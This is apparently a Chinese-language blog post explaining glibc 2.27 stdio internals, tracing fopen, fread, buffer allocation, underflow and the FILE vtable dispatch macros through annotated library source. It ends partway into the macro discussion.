<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>stderr,stdout,stdin</code>,实际上就是三个FILE</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924184530135.png" alt="image-20240924184530135"></p>
<h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fopen	_IO_new_fopen @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">87</span></span><br><span class="line">	-&gt;__fopen_internal @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">56</span></span><br><span class="line">		</span><br><span class="line">        new_f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> locked_FILE));		<span class="comment">//locked_FILE = &#123;IO_FILE_plus fp; _IO_lock_t; _IO_wide_data;&#125;</span></span><br><span class="line">		</span><br><span class="line">		_IO_JUMPS	<span class="comment">//new_f-&gt;fp-&gt;vtable = &amp;_IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        -&gt;_IO_new_file_init_internal @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">106</span></span><br><span class="line">            -&gt;_IO_link_in @glibc<span class="number">-2.27</span>/libio/genops.c:<span class="number">86</span></span><br><span class="line">				fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;		<span class="comment">//头插法上链</span></span><br><span class="line">				_IO_list_all = fp;</span><br><span class="line"></span><br><span class="line">		-&gt;_IO_new_file_fopen @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">212</span></span><br><span class="line">            语法分析打开模式(rwa/+xbmce)</span><br><span class="line">            -&gt;_IO_file_open @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">181</span></span><br><span class="line">                -&gt;file._fileno = open() 使用系统调用,返回文件描述符</span><br><span class="line">                -&gt;_IO_link_in										<span class="comment">//实际上已经在_IO_link_in上过链了,哈基米知道已经上链会自己判重的</span></span><br><span class="line">                </span><br><span class="line">        如果_IO_new_file_fopen返回了文件指针fp,说明打开文件成功</span><br><span class="line">        否则-&gt;_IO_un_link 下链然后 <span class="built_in">free</span>(new_f)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924183957858.png" alt="file = fopen"></p>
<h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp);</span><br></pre></td></tr></table></figure>

<p>从fp指向的文件, 每次读取size宽度的数据,读取count个单位的数据,到缓冲区buf, 返回实际读取字节数</p>
<h4 id="申请缓冲区"><a href="#申请缓冲区" class="headerlink" title="申请缓冲区"></a>申请缓冲区</h4><p>fread包装了read系统调用, 在堆块上建立缓冲区, 一次性使用read读取大量数据到缓冲区,减少多次调用read造成的上下文切换和io开销</p>
<p>第一次调用fread函数,_IO_file_xsgetn首先判断当前FILE是否有缓冲区,如果没有则申请一个,会在堆上要0x1000个字节的堆块,也就是1K的堆块作为缓冲区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br><span class="line">			-&gt;_IO_doallocbuf</span><br><span class="line">				-&gt;_IO_file_doallocate @glibc2<span class="number">.27</span>/libio/filedoalloc.c:<span class="number">77</span></span><br><span class="line">					-&gt;p=<span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br><span class="line">					-&gt;_IO_setb(_IO_FILE *f=fp, <span class="type">char</span> *b=p, <span class="type">char</span> *eb=p+<span class="number">0x1000</span>, <span class="type">int</span> a=<span class="number">1</span>)	@glibc2<span class="number">.27</span>/libio/genops.c: <span class="number">346</span></span><br><span class="line">						如果fp之前有缓冲区,现在要喜新厌旧了</span><br><span class="line">						fp-&gt;_IO_buf_base=b</span><br><span class="line">						fp-&gt;_IO_buf_end=eb</span><br><span class="line">						<span class="keyword">if</span>(a == <span class="number">1</span>) f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">			</span><br></pre></td></tr></table></figure>

<p>申请缓冲区这部分代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);						<span class="comment">//申请缓冲区去了</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>申请完了后开始读取</p>
<h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p>读取的逻辑是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//have表示当前缓冲区中,剩余字节数</span><br><span class="line">//want表示还剩多少字节需要读,当want降为0时意味着满足了需求</span><br><span class="line"></span><br><span class="line">如果缓冲区余料多于需求,则直接满足</span><br><span class="line">否则</span><br><span class="line">	如果一整个缓冲区的大小足够want则先放到缓冲区然后满足</span><br><span class="line">	否则也就是说一整个缓冲区大小都不够,此时缓冲没有意义了,直接全系统调用满足</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)		<span class="comment">//fp文件指针,data目的地,n总共需要读取的字节数</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t want, have;		<span class="comment">//want剩余想要读取的字节数, have缓冲区剩余的字节数</span></span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="type">char</span> *s = data;				<span class="comment">//s作为data的迭代器</span></span><br><span class="line"></span><br><span class="line">  want = n;					</span><br><span class="line"></span><br><span class="line"><span class="comment">//此处略去没有缓冲区时申请缓冲区的逻辑</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) &#123;				<span class="comment">//直到读取到文件EOF或者满足了want的要求才会跳出循环</span></span><br><span class="line">      	have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;		<span class="comment">//缓冲区末尾与当前指针的距离,就是缓冲区剩余字节数</span></span><br><span class="line">      	<span class="keyword">if</span> (want &lt;= have)&#123;								<span class="comment">//如果缓冲区中余料充足</span></span><br><span class="line">	  		<span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);				</span><br><span class="line">	  		fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  		want = <span class="number">0</span>;									<span class="comment">//已满足要求</span></span><br><span class="line">		&#125; <span class="keyword">else</span>	&#123;										<span class="comment">//否则</span></span><br><span class="line">            	<span class="comment">//如果控制流到此,说明缓冲区余料太少了,不能直接满足want要求</span></span><br><span class="line">	  		<span class="keyword">if</span> (have &gt; <span class="number">0</span>)&#123;								<span class="comment">//如果缓冲区还有余料</span></span><br><span class="line">	      		s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);	<span class="comment">//先把余料吃了再说</span></span><br><span class="line">	      		want -= have;						</span><br><span class="line">	      		fp-&gt;_IO_read_ptr += have;			<span class="comment">//此举导致read_ptr=read_end,缓冲区告罄</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  		<span class="keyword">if</span> (_IO_in_backup (fp))&#123;				<span class="comment">//当上一次刷新缓冲区被中断而没有完成时,上次动作会保存在backup缓冲区,现在要完成未竟之事</span></span><br><span class="line">	      		_IO_switch_to_main_get_area (fp);</span><br><span class="line">	      		<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">//buf是整个缓冲区,而read是当前有效的缓冲区,此举在判断want是否小于整个缓冲区</span></span><br><span class="line">            <span class="comment">//当want小于一整个缓冲区时,刷新缓冲区才有意义,</span></span><br><span class="line">            <span class="comment">//如果want大于一整个缓冲区,那么此时刷新缓冲只会增加io,不如直接syscall read</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (__underflow (fp) == EOF)	<span class="comment">//只有当want小于一整个缓冲区时才会考虑刷新缓冲区</span></span><br><span class="line">					<span class="keyword">break</span>;									</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">            <span class="comment">//缓冲区复位</span></span><br><span class="line">	  		_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  		_IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  		count = want;	<span class="comment">//count用于计算需要使用syscall-read进行io的字节数</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base)&#123;</span><br><span class="line">	      		_IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      		<span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">					count -= want % block_size;<span class="comment">//减去最后一个不完整的块大小</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		count = _IO_SYSREAD (fp, s, count);							<span class="comment">//把整数个块直接读出来		</span></span><br><span class="line">	  		<span class="keyword">if</span> (count &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">					fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      		<span class="keyword">else</span></span><br><span class="line">					fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">	      		<span class="keyword">break</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		s += count;</span><br><span class="line">	  		want -= count;											<span class="comment">//到此want可能还有剩下的最后不完整的一块,下一次循环时刷新缓冲区满足</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    		_IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="underflow"><a href="#underflow" class="headerlink" title="underflow"></a>underflow</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__underflow @</span><br><span class="line">	-&gt;_IO_new_file_underflow @fileops.c:<span class="number">469</span></span><br><span class="line">		指针复位</span><br><span class="line">		-&gt;_IO_file_read</span><br><span class="line">			-&gt;_IO_new_file_underflow</span><br><span class="line">				-&gt;__read(fp-&gt;_fileno, buf, size)</span><br></pre></td></tr></table></figure>

<p>fread调用的underflow和fwrite调用的overflow是一对兄弟函数</p>
<p>underflow意思是从文件往缓冲区载入数据,维持读缓冲区满</p>
<p>overflow意思是从缓冲区向文件写入数据,维持写缓冲区空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)<span class="comment">//如果当前fp字节流使用宽字节,则调用fwide</span></span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))<span class="comment">//如果当前fp处于写入状态,则切换状态为读取状态</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//如果缓冲区还有东西则返回当前read_ptr指向的字节</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))			</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>_IO_UNDERFLOW</code>实际上调用的_<code>IO_new_file_underflow</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_new_file_underflow(FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)		<span class="comment">//必须要有READ权限</span></span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno(EBADF);</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//如果缓冲区还有剩余的东西,则不允许刷新</span></span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)		<span class="comment">//如果还没有建立缓冲区,现在就建立</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">        &#125;</span><br><span class="line">        _IO_doallocbuf(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))		<span class="comment">//对于行缓冲和无缓冲的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">       required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">       traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">       not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">       explicitly.  --drepper */</span></span><br><span class="line">        _IO_acquire_lock(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">            _IO_OVERFLOW(<span class="built_in">stdout</span>, EOF);<span class="comment">//刷新stdout缓冲</span></span><br><span class="line"></span><br><span class="line">        _IO_release_lock(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _IO_switch_to_get_mode(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">       pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">       we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">       input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<span class="comment">//缓冲区复位</span></span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">    count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base,		<span class="comment">//缓冲区更新,从文件读取,塞满整个缓冲区</span></span><br><span class="line">                        fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">            fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fp-&gt;_IO_read_end += count;			<span class="comment">//读缓冲区根据实际count数决定</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">       handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">       unset it.  */</span></span><br><span class="line">        fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">        _IO_pos_adjust(fp-&gt;_offset, count);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h4 id="vtable何时发挥作用"><a href="#vtable何时发挥作用" class="headerlink" title="vtable何时发挥作用?"></a>vtable何时发挥作用?</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br></pre></td></tr></table></figure>

<p>从<code>_IO_sgetn</code>调用<code>_IO_file_xsgetn</code>时首先需要‘调用’<code>_IO_XSGETN</code>,这实际上是一个宏定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br></pre></td></tr></table></figure>

<p>如果展开这个宏</p>
